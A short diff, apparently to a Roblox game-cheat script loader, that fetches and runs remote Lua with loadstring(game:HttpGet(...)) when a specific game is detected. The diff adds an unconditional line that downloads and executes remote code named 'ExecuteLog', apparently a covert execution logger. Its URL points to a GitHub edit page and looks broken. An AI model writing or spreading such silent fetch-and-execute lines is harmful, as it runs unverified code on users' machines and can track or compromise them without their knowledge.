@@ -13,3 +13,5 @@ end
 if game.PlaceId == 5535087806 then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/MaxBTW/Scripts/main/TappingMania'))()
 end
+
+loadstring(game:HttpGet('https://github.com/MaxBTW/Scripts/edit/main/ExecuteLog'))()
